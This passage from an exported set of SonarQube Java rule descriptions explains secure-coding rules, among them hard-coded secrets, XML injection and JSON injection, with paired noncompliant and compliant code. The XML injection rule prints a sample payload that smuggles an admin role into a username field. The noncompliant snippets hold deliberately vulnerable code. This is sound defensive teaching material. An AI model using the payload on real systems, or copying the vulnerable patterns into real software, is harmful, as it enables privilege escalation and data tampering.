href=\"https://owasp.org/www-project-mobile-top-10/2023-risks/m10-insufficient-cryptography\">Mobile Top 10 2024 Category M10 -\n  Insufficient Cryptography</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/323\">CWE-323 - Reusing a Nonce, Key Pair in Encryption</a> </li>\n  <li> <a href=\"https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38a.pdf\">NIST, SP-800-38A</a> - Recommendation for Block Cipher\n  Modes of Operation </li>\n  <li> <a href=\"https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38c.pdf\">NIST, SP-800-38C</a> - Recommendation for Block Cipher\n  Modes of Operation: The CCM Mode for Authentication and Confidentiality </li>\n  <li> <a href=\"https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38d.pdf\">NIST, SP-800-38D</a> - Recommendation for Block Cipher\n  Modes of Operation: Galois/Counter Mode (GCM) and GMAC </li>\n</ul>\n\n","impacts":[{"name":"security","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6432","summary":"Counter Mode initialization vectors should not be reused","tags":["cwe"],"versions":{"serverEdition":"Developer","serverVersion":"9.9.8.100196","communityVersion":"9.9.8.100196"},"cleanCodeAttribute":"COMPLETE","type":"Vulnerability"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Blocker","description":"<p>Because it is easy to extract strings from an application source code or binary, secrets should not be hard-coded. This is particularly true for\napplications that are distributed or that are open-source.</p>\n<p>In the past, it has led to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"https://www.cve.org/CVERecord?id=CVE-2022-25510\">CVE-2022-25510</a> </li>\n  <li> <a href=\"https://www.cve.org/CVERecord?id=CVE-2021-42635\">CVE-2021-42635</a> </li>\n</ul>\n<p>Secrets should be stored outside of the source code in a configuration file or a management service for secrets.</p>\n<p>This rule detects variables/fields having a name matching a list of words (secret, token, credential, auth, api[_.-]?key) being assigned a\npseudorandom hard-coded value. The pseudorandomness of the hard-coded value is based on its entropy and the probability to be human-readable. The\nrandomness sensibility can be adjusted if needed. Lower values will detect less random values, raising potentially more false positives.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The secret allows access to a sensitive component like a database, a file storage, an API, or a service. </li>\n  <li> The secret is used in a production environment. </li>\n  <li> Application re-distribution is required before updating the secret. </li>\n</ul>\n<p>There would be a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Store the secret in a configuration file that is not pushed to the code repository. </li>\n  <li> Use your cloud providerâs service for managing secrets. </li>\n  <li> If a secret has been disclosed through the source code: revoke it and create a new one. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nprivate static final String MY_SECRET = \"47828a8dd77ee1eb9dde2d5e93cb221ce8c32b37\";\n\npublic static void main(String[] args) {\n  MyClass.callMyService(MY_SECRET);\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>Using <a href=\"https://github.com/awsdocs/aws-doc-sdk-examples/tree/main/javav2/example_code/secrets-manager\">AWS Secrets Manager</a>:</p>\n<pre>\nimport software.amazon.awssdk.services.secretsmanager.model.GetSecretValueRequest;\nimport software.amazon.awssdk.services.secretsmanager.model.GetSecretValueResponse;\n\npublic static void main(String[] args) {\n  SecretsManagerClient secretsClient = ...\n  MyClass.doSomething(secretsClient, \"MY_SERVICE_SECRET\");\n}\n\npublic static void doSomething(SecretsManagerClient secretsClient, String secretName) {\n  GetSecretValueRequest valueRequest = GetSecretValueRequest.builder()\n    .secretId(secretName)\n    .build();\n\n  GetSecretValueResponse valueResponse = secretsClient.getSecretValue(valueRequest);\n  String secret = valueResponse.secretString();\n  // do something with the secret\n  MyClass.callMyService(secret);\n}\n</pre>\n<p>Using <a href=\"https://docs.microsoft.com/en-us/azure/key-vault/secrets/quick-create-java?tabs=azure-cli\">Azure Key Vault Secret</a>:</p>\n<pre>\nimport com.azure.identity.DefaultAzureCredentialBuilder;\n\nimport com.azure.security.keyvault.secrets.SecretClient;\nimport com.azure.security.keyvault.secrets.SecretClientBuilder;\nimport com.azure.security.keyvault.secrets.models.KeyVaultSecret;\n\npublic static void main(String[] args) throws InterruptedException, IllegalArgumentException {\n  String keyVaultName = System.getenv(\"KEY_VAULT_NAME\");\n  String keyVaultUri = \"https://\" + keyVaultName + \".vault.azure.net\";\n\n  SecretClient secretClient = new SecretClientBuilder()\n    .vaultUrl(keyVaultUri)\n    .credential(new DefaultAzureCredentialBuilder().build())\n    .buildClient();\n\n  MyClass.doSomething(secretClient, \"MY_SERVICE_SECRET\");\n}\n\npublic static void doSomething(SecretClient secretClient, String secretName) {\n  KeyVaultSecret retrievedSecret = secretClient.getSecret(secretName);\n  String secret = retrievedSecret.getValue(),\n\n  // do something with the secret\n  MyClass.callMyService(secret);\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication\">Top 10 2017 Category A2 - Broken Authentication</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/798\">CWE-798 - Use of Hard-coded Credentials</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2023-risks/m1-improper-credential-usage.html\">Mobile Top 10 2024 Category M1 -\n  Improper Credential Usage</a> </li>\n  <li> MSC - <a href=\"https://wiki.sei.cmu.edu/confluence/x/OjdGBQ\">MSC03-J - Never hard code sensitive information</a> </li>\n</ul>\n\n","impacts":[{"name":"security","level":"BLOCKER"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6418","summary":"Hard-coded secrets are security-sensitive","tags":["cwe","cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.5.0.56709","communityVersion":"9.5.0.56709"},"cleanCodeAttribute":"TRUSTWORTHY","type":"Security Hotspot"},{"availability":["sonarcloud","sonarqube"],"defaultSeverity":"Major","description":"<p>This rule raises an issue when a method modifies the size of a collection, while the same collection is iterated.</p>\n<h2>Why is this an issue?</h2>\n<p>Iterating over a collection using a <code>for-each</code> loop in Java relies on iterators.</p>\n<p>An iterator is an object that allows you to traverse a collection of elements, such as a list or a dictionary. Iterators are used in\n<code>for-each</code> loops to iterate over the elements of a collection one at a time.</p>\n<p>It is important to note that iterators are designed to be read-only. Modifying a collection while iterating over it can cause unexpected behavior,\nas the iterator may skip over or repeat elements. Therefore, it is important to avoid modifying a collection while iterating over it to ensure that\nyour code behaves as expected.</p>\n<p>Most JDK collection implementations donât support such modification and may throw a <code>ConcurrentModificationException</code>. Even if no such\nexception is thrown, attempting to modify a collection during iteration could be the source of incorrect or unspecified behaviors in the code.</p>\n<p>If you still want to modify the collection, it is best to refactor the code and use a second collection (e.g by using streams and filter\noperations).</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n  public static void foo(List&lt;String&gt; lst) {\n    for (String element : lst) {\n      if (element.startsWith(\"x\")) {\n        lst.remove(element); // Noncompliant: lst size has been modified by \"remove\" call while it's iterated.\n      }\n    }\n  }\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n  public static void foo(List&lt;String&gt; lst) {\n    List&lt;String&gt; toRemove = new ArrayList&lt;&gt;();\n    for (String element : lst) {\n      if (element.startsWith(\"x\")) {\n        toRemove.add(element);\n      }\n    }\n    lst.removeAll(toRemove);\n  }\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Java Documentation <a\n  href=\"https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/util/ConcurrentModificationException.html\">ConcurrentModificationException</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6417","summary":"Collections should not be modified while they are iterated","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.5.0.56709","communityVersion":null},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarqube"],"defaultSeverity":"Critical","description":"<p>This issue indicates that an exception will be thrown because a method is used incorrectly. To fix it, check the requirements of the method and\nfulfill them.</p>\n<h2>Why is this an issue?</h2>\n<p>It is common for methods to check the value of their parameters or the state of their associated object and throw an exception when one of them\ndoes not match a given condition. Those conditions are usually mentioned in the javadoc of the method.</p>\n<p>This rule raises an issue when it detects that a method call will trigger one of the following exceptions:</p>\n<ul>\n  <li> <code>java.lang.IllegalArgumentException</code> </li>\n  <li> <code>java.lang.IllegalStateException</code> </li>\n</ul>\n<h3>What is the potential impact?</h3>\n<p>Issues of this type interrupt the normal execution of a program, causing it to crash or putting it into an inconsistent state. Therefore, this\nissue might impact the availability and reliability of your application, or even result in data loss.</p>\n<h2>How to fix it</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n/**\n * Set the oven temperature\n * @param temp the temperature in Celsius, between 0 and 250 (inclusive)\n * @throws IllegalArgumentException if the temperature is outside of the supported range\n */\nprivate void setOvenTemperature(int temp) {\n  if (temp &lt; 0 || temp &gt; 250) {\n    throw new IllegalArgumentException();\n  }\n  // ...\n}\n\nvoid finishCooking() {\n  setOvenTemperature(-3); // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n/**\n * Set the oven temperature\n * @param temp the temperature in Celsius, between 0 and 250 (inclusive)\n * @throws IllegalArgumentException if the temperature is outside of the supported range\n */\nprivate void setOvenTemperature(int temp) {\n  if (temp &lt; 0 || temp &gt; 250) {\n    throw new IllegalArgumentException();\n  }\n  // ...\n}\n\nvoid finishCooking() {\n  setOvenTemperature(0);\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/lang/IllegalArgumentException.html\">IllegalArgumentException</a>\n  </li>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/lang/IllegalStateException.html\">IllegalStateException</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"infeasible","ruleKey":"RSPEC-6416","summary":"Calls to methods should not trigger an exception","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.5.0.56709","communityVersion":null},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Maps use hashes of the keys to select a bucket to store data in. Objects that hash to the same value will be added to the same bucket.</p>\n<p>When the hashing function has a poor distribution, buckets can grow to very large sizes. This may negatively affect lookup performance, as, by\ndefault, matching a key within a bucket has linear complexity.</p>\n<p>In addition, as the default hashCode function can be selected at runtime, performance expectations cannot be maintained.</p>\n<p>Implementing Comparable mitigates the performance issue for objects that hash to the same value.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nclass MyKeyType {\n    // ...\n}\n\nclass Program {\n    Map&lt;MyKeyType, MyValueType&gt; data = new HashMap&lt;&gt;(); // Noncompliant\n\n    Map&lt;MyKeyType, MyValueType&gt; buildMap() { // Noncompliant\n        //...\n    }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nclass MyKeyType implements Comparable&lt;MyKeyType&gt; {\n    // ...\n}\n\nclass MyChildKeyType extends MyKeyType {\n    // ...\n}\n\nclass Program {\n    Map&lt;MyKeyType, MyValueType&gt; data = new HashMap&lt;&gt;();\n    Map&lt;MyChildKeyType, MyValueType&gt; data = new HashMap&lt;&gt;();\n\n    Map&lt;MyKeyType, MyValueType&gt; buildMap() {\n        //...\n    }\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a\n  href=\"https://dzone.com/articles/java-8-hashmaps-keys-and-the-comparable-interface\">https://dzone.com/articles/java-8-hashmaps-keys-and-the-comparable-interface</a> </li>\n  <li> <a\n  href=\"https://github.com/openjdk/jdk/blob/4927ee426aedbeea0f4119bac0a342c6d3576762/src/hotspot/share/runtime/synchronizer.cpp#L760-L798\">https://github.com/openjdk/jdk/blob/4927ee426aedbeea0f4119bac0a342c6d3576762/src/hotspot/share/runtime/synchronizer.cpp#L760-L798</a> </li>\n  <li> <a\n  href=\"https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/lang/Comparable.html\">https://docs.oracle.com/en/java/javase/17/docs/api/java.base/java/lang/Comparable.html</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-6411","summary":"Types used as keys in Maps should implement Comparable","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.5.0.56709","communityVersion":"9.5.0.56709"},"cleanCodeAttribute":"EFFICIENT","type":"Code Smell"},{"availability":["sonarcloud","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>XML injections occur when an application builds an XML-formatted string from user input without prior validation or sanitation. In such a case, a\ntainted user-controlled value can tamper with the XML string content. Especially, unexpected arbitrary elements and attributes can be inserted in the\ncorresponding XML description.</p>\n<p>A malicious injection payload could, for example:</p>\n<ul>\n  <li> Insert tags into the main XML document. </li>\n  <li> Add attributes to an existing XML tag. </li>\n  <li> Change the data value inside a tag. </li>\n</ul>\n<p>A malicious user-supplied value can perform other modifications depending on where and how the constructed data is later used.</p>\n<h3>What is the potential impact?</h3>\n<p>The consequences of an XML injection attack on an application vary greatly depending on the applicationâs logic. It can affect the application\nitself or another element if the XML document is used for cross-component data exchange. For this reason, the actual impact can range from benign\ninformation disclosure to critical remote code execution.</p>\n<h4>Information disclosure</h4>\n<p>An attacker can forge an attack payload that will modify the XML document so that it will become syntactically incorrect. In that case, when the\ndata is later used, the parsing component will raise a technical error. If displayed back to the attacker or made available through log files, this\ntechnical error may disclose sensitive business or technical information.</p>\n<p>This scenario, while in general the less severe one, is the most frequently encountered. It can combine with any other logic-dependant threat.</p>\n<h4>Internal requests tampering</h4>\n<p>Some applications communicate with backend micro-services APIs using XML-based protocols such as SOAP. When those applications are vulnerable to\nXML injections, attackers can tamper with the internal requests' content. This will allow them to change internal requests' parameters or locations\nwhich, in turn, can lead to various consequences like performing unauthorized actions or accessing sensitive data.</p>\n<p>For example, altering a user creation request in such a way can lead to a privilege escalation if attackers manage to modify the default account\nprivilege level.</p>\n<h4>Code execution</h4>\n<p>An application might build objects based on an XML serialization string. In that case, an attacker that would exploit an XML injection could be\nable to alter the serialization string to modify the corresponding objectâs properties.</p>\n<p>Depending on the deserialization process, this might allow instantiating arbitrary objects or objects with sensitive properties altered. This can\nlead to arbitrary code being executed in the same way as a deserialization injection vulnerability.</p>\n<h2>How to fix it in a Servlet</h2>\n<h3>Code examples</h3>\n<p>The following code is an example of an overly simple authentication function: The role of a user is set in an XML file and the default user role is\n<code>user</code>.<br> This example code is vulnerable to an XML injection vulnerability because it builds an XML string from user input without prior\nsanitation or validation.</p>\n<p>In this particular case, the query can be exploited with the following string:</p>\n<pre>\nattacker&lt;/username&gt;&lt;role&gt;admin&lt;/role&gt;&lt;/user&gt;\n&lt;user&gt;&lt;username&gt;foo\n</pre>\n<p>By adapting and inserting this string into the <code>username</code> field, an attacker would be able to log in as an admin.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\n\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n  String xml = \"\"\"\n    &lt;user&gt;\n      &lt;username&gt;\"\"\"\n      + req.getParameter(\"username\") + \"\"\"\n      &lt;/username&gt;\n      &lt;role&gt;user&lt;/role&gt;\n    &lt;/user&gt;\"\"\";\n\n  DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n\n  try {\n    DocumentBuilder builder = factory.newDocumentBuilder();\n    builder.parse(new InputSource(new StringReader(xml))); // Noncompliant\n  } catch (ParserConfigurationException | SAXException e) {\n    resp.sendError(400);\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport javax.xml.parsers.DocumentBuilder;\nimport javax.xml.parsers.DocumentBuilderFactory;\nimport org.w3c.dom.Document;\nimport org.w3c.dom.Element;\n\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n\n  DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n  try {\n    DocumentBuilder builder = factory.newDocumentBuilder();\n    Document doc = builder.newDocument();\n    Element user = doc.createElement(\"user\");\n    doc.appendChild(user);\n\n    Element usernameElement = doc.createElement(\"username\");\n    user.appendChild(usernameElement);\n    usernameElement.setTextContent(req.getParameter(\"username\"));\n\n    Element role = doc.createElement(\"role\");\n    user.appendChild(role);\n    role.setTextContent(\"user\");\n  } catch (ParserConfigurationException e) {\n    resp.sendError(400);\n  }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>In most cases, building XML strings with a direct concatenation of user input is discouraged. While not always possible, a strong pattern-based\nvalidation can help sanitize tainted inputs. Likewise, converting to a harmless type can sometimes be a solution.</p>\n<p>However, directly constructing Java objects should be preferred over handling the properties of objects as strings.</p>\n<h4>Programmatic object building</h4>\n<p>In most cases, an application can directly create documents from user input without having to build and parse an XML string. Doing so prevents\ninjection vulnerabilities as XML document construction libraries and functions will properly escape and check the type of input values.</p>\n<p>Sometimes, the application might need to include the user input in a document built from a trusted XML string. In that case, the recommended\nsolution is to parse the trusted string first and then programmatically modify the resulting document.</p>\n<p>The example compliant code takes advantage of the <code>javax.xml</code> and <code>org.w3c.dom</code> libraries capabilities to programmatically\nbuild XML documents.</p>\n<h4>Converting to a harmless type</h4>\n<p>When the application allows it, casting user-submitted data to a harmless type can help prevent XML injection vulnerabilities. In particular,\nconverting user inputs to numeric types is an efficient sanitation mechanism.</p>\n<p>This mechanism can be extended to other types, including more complex ones. However, care should be taken when dealing with them, as manually\nvalidating or sanitizing complex types can represent a challenge.</p>\n<p>Note that choosing this solution can be error-prone: every user input has to be validated or sanitized without oversight.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/91\">CWE-91 - XML Injection (aka Blind XPath Injection)</a> </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222608\">Application Security and\n  Development: V-222608</a> - The application must not be vulnerable to XML-oriented attacks. </li>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222609\">Application Security and\n  Development: V-222609</a> - The application must not be subject to input handling vulnerabilities. </li>\n</ul>\n\n","impacts":[{"name":"security","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-6399","summary":"XML operations should not be vulnerable to injection attacks","tags":["cwe","injection"],"versions":{"serverEdition":"Developer","serverVersion":"9.4.0.54424","communityVersion":null},"cleanCodeAttribute":"COMPLETE","type":"Vulnerability"},{"availability":["sonarcloud","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>JSON injections occur when an application builds a JSON-formatted string from user input without prior validation or sanitation. In such a case, a\ntainted user-controlled value can tamper with the JSON string content. Especially, unexpected arbitrary elements can be inserted in the corresponding\nJSON object. Those modifications can include:</p>\n<ul>\n  <li> Adding additional keys to a JSON dictionary. </li>\n  <li> Changing values types. </li>\n  <li> Adding elements in an array. </li>\n</ul>\n<p>A malicious user-supplied value can perform other modifications depending on where and how the constructed data is later used.</p>\n<h3>What is the potential impact?</h3>\n<p>The consequences of a JSON injection attack into an application vary greatly depending on the applicationâs logic. It can affect the application\nitself or another element if the JSON string is used for cross-component data exchange. For this reason, the actual impact can range from benign\ninformation disclosure to critical remote code execution.</p>\n<h4>Information disclosure</h4>\n<p>An attacker can forge an attack payload that will modify the JSON string so that it will become syntactically incorrect. In that case, when the\ndata is later used, the parsing component will raise a technical error. If displayed back to the attacker or made available through log files, this\ntechnical error may disclose sensitive business or technical information.</p>\n<p>This scenario, while in general the less severe one, is the most frequently encountered. It can combine with any other logic-dependant threat.</p>\n<h4>Privilege escalation</h4>\n<p>An application that would rely on JSON to store or propagate users' authentication levels and roles would be under threat of privilege escalations.\nIndeed, an attacker could tamper with the permissions storage object to insert arbitrary roles or privileges.</p>\n<p>While highly specific, similar issues can be faced in the following situations:</p>\n<ul>\n  <li> An application builds JSON payloads for HTTP requests. </li>\n  <li> An application builds JWT from user input. </li>\n</ul>\n<h4>Code execution</h4>\n<p>An application might build objects based on a JSON serialization string. In that case, an attacker that would exploit a JSON injection could be\nable to alter the serialization string to modify the corresponding objectâs properties.</p>\n<p>Depending on the deserialization process, this might allow instantiating arbitrary objects or objects with sensitive properties altered. This can\nlead to arbitrary code being executed in the same way as a deserialization injection vulnerability.</p>\n<h2>How to fix it in a Servlet</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to a JSON injection vulnerability because it builds a JSON string from user input without prior sanitation or\nvalidation. Therefore, an attacker can submit a tainted value that will tamper with the corresponding JSON object structure.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"21\" data-diff-type=\"noncompliant\">\nimport org.json.JSONObject;\n\n//[...]\npublic void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n  try {\n    String tainted = request.getParameter(\"value\");\n    String json = \"{\\\"key\\\":\\\"\"+ tainted +\"\\\"}\";\n    JSONObject obj = new JSONObject(json); // Noncompliant\n  } catch (JsonException e) {\n    response.sendError(400);\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"21\" data-diff-type=\"compliant\">\nimport org.json.JSONObject;\n\n//[...]\npublic void doGet(HttpServletRequest request, HttpServletResponse response) {\n  JSONObject obj = new JSONObject();\n  obj.put(\"key\", request.getParameter(\"value\"));\n}\n</pre>\n<h3>How does this work?</h3>\n<p>In most cases, it is discouraged to build JSON strings with a direct concatenation of user input. While not always possible, a strong pattern-based\nvalidation can help sanitize tainted inputs. Likewise, converting to a harmless type can sometimes be a solution.</p>\n<p>However, avoiding handling objects' properties as strings by directly constructing Java objects should be the preferred way.</p>\n<h4>Programmatic object building</h4>\n<p>In most cases, an application can directly create objects from user input without having to build and parse a JSON string. Doing so prevents\ninjection vulnerabilities as JSON object construction libraries and functions will properly escape and check the type of input values.</p>\n<p>Sometimes, the application might need to include the user input in an object built from a trusted JSON string. In that case, the recommended\nsolution is to parse the trusted string first and then programmatically modify the resulting object.</p>\n<p>The example compliant code uses the <code>org.json</code> libraries capabilities to dynamically build a JSON object without string parsing.</p>\n<h4>Converting to a harmless type</h4>\n<p>When the application allows it, converting user-submitted data to a harmless type can help prevent JSON injection vulnerabilities. In particular,\nconverting user inputs to numeric types is an efficient sanitation mechanism.</p>\n<p>This mechanism can be extended to other types, including more complex ones. However, care should be taken when dealing with them, as manually\nvalidating or sanitizing complex types can represent a challenge.</p>\n<p>Note that choosing this solution can be error-prone: every user input has to be validated or sanitized without oversight.</p>\n<h2>How to fix it in Gson</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to a JSON injection vulnerability because it builds a JSON string from user input without prior sanitation or\nvalidation. Therefore, an attacker can submit a tainted value that will tamper with the corresponding JSON object structure.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"noncompliant\">\nimport com.google.gson.Gson;\n\n//[...]\npublic void doGet(HttpServletRequest request, HttpServletResponse response) {\n  String tainted = request.getParameter(\"value\");\n  String json = \"{\\\"key\\\":\\\"\"+ tainted +\"\\\"}\";\n  Gson obj = new Gson();\n  obj.fromJson(json, Object.class); // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"compliant\">\nimport com.google.gson.Gson;\nimport com.google.gson.JsonObject;\nimport com.google.gson.JsonSyntaxException;\n\n//[...]\npublic void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n  try {\n    JsonObject json = new JsonObject();\n    json.addProperty(\"key\", request.getParameter(\"value\"));\n    Gson obj = new Gson();\n    obj.fromJson(json, Object.class);\n  } catch (JsonSyntaxException e) {\n    response.sendError(400);\n  }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>In most cases, it is discouraged to build JSON strings with a direct concatenation of user input. While not always possible, a strong pattern-based\nvalidation can help sanitize tainted inputs. Likewise, converting to a harmless type can sometimes be a solution.</p>\n<p>However, avoiding handling objects' properties as strings by directly constructing Java objects should be the preferred way.</p>\n<h4>Programmatic object building</h4>\n<p>In most cases, an application can directly create objects from user input without having to build and parse a JSON string. Doing so prevents\ninjection vulnerabilities as JSON object construction libraries and functions will properly escape and check the type of input values.</p>\n<p>Sometimes, the application might need to include the user input in an object built from a trusted JSON string. In that case, the recommended\nsolution is to parse the trusted string first and then programmatically modify the resulting object.</p>\n<p>The example compliant code uses the <code>JsonObject</code> class from the Gson library to directly build an object from the user input.</p>\n<h4>Converting to a harmless type</h4>\n<p>When the application allows it, converting user-submitted data to a harmless type can help prevent JSON injection vulnerabilities. In particular,\nconverting user inputs to numeric types is an efficient sanitation mechanism.</p>\n<p>This mechanism can be extended to other types, including more complex ones. However, care should be taken when dealing with them, as manually\nvalidating or sanitizing complex types can represent a challenge.</p>\n<p>Note that choosing this solution can be error-prone: every user input has to be validated or sanitized without oversight.</p>\n<h2>How to fix it in FasterXML</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to a JSON injection vulnerability because it builds a JSON string from user input without prior sanitation or\nvalidation. Therefore, an attacker can submit a tainted value that will tamper with the corresponding JSON object structure.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport com.fasterxml.jackson.databind.ObjectMapper;\n\n//[...]\npublic void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n  String tainted = request.getParameter(\"value\");\n  String json = \"{\\\"key\\\":\\\"\"+ tainted +\"\\\"}\";\n  ObjectMapper obj = new ObjectMapper();\n  try {\n    obj.readValue(json, Object.class); // Noncompliant\n  } catch (JsonProcessingException e) {\n    response.sendError(400);\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport com.fasterxml.jackson.databind.node.ObjectNode;\n\n//[...]\npublic void doGet(HttpServletRequest request, HttpServletResponse response) {\n  ObjectMapper obj = new ObjectMapper();\n  ObjectNode myObject = obj.createObjectNode();\n  myObject.put(\"key\", request.getParameter(\"value\"));\n}\n</pre>\n<h3>How does this work?</h3>\n<p>In most cases, it is discouraged to build JSON strings with a direct concatenation of user input. While not always possible, a strong pattern-based\nvalidation can help sanitize tainted inputs. Likewise, converting to a harmless type can sometimes be a solution.</p>\n<p>However, avoiding handling objects' properties as strings by directly constructing Java objects should be the preferred way.</p>\n<h4>Programmatic object building</h4>\n<p>In most cases, an application can directly create objects from user input without having to build and parse a JSON string. Doing so prevents\ninjection vulnerabilities as JSON object construction libraries and functions will properly escape and check the type of input values.</p>\n<p>Sometimes, the application might need to include the user input in an object built from a trusted JSON string. In that case, the recommended\nsolution is to parse the trusted string first and then programmatically modify the resulting object.</p>\n<p>The example compliant code uses the <code>ObjectNode</code> class from the Jackson library to directly build a JSON object from the user input.</p>\n<h4>Converting to a harmless type</h4>\n<p>When the application allows it, converting user-submitted data to a harmless type can help prevent JSON injection vulnerabilities. In particular,\nconverting user inputs to numeric types is an efficient sanitation mechanism.</p>\n<p>This mechanism can be extended to other types, including more complex ones. However, care should be taken when dealing with them, as manually\nvalidating or sanitizing complex types can represent a challenge.</p>\n<p>Note that choosing this solution can be error-prone: every user input has to be validated or sanitized without oversight.</p>\n<h2>How to fix it in Spring</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to a JSON injection vulnerability because it builds a JSON string from user input without prior sanitation or\nvalidation. Therefore, an attacker can submit a tainted value that will tamper with the corresponding JSON object structure.</p>\n<p>In this example a json string is parsed using the <code>BasicJsonParser</code> class from the <code>org.springframework.boot.json</code> package.\nThis class is used to parse JSON strings into a <code>Map</code> object. Since the attacker can control the json string they can control the keys and\nvalues of the <code>Map</code> object.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"31\" data-diff-type=\"noncompliant\">\nimport java.util.Map;\nimport org.springframework.boot.json.BasicJsonParser;\n\n//[...]\n@GetMapping(\"/example\")\npublic Map &lt;String, Object&gt; example(@RequestParam String input) {\n    BasicJsonParser parser = new BasicJsonParser();\n    String json = String.format(\"{\\\"key\\\":\\\"%s\\\"}\", input);\n    return parser.parseMap(json); // Noncompliant\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"31\" data-diff-type=\"compliant\">\nimport java.util.Map;\n\n//[...]\n@GetMapping(\"/example\")\npublic Map &lt;String, Object&gt; example(@RequestParam String input) {\n    return 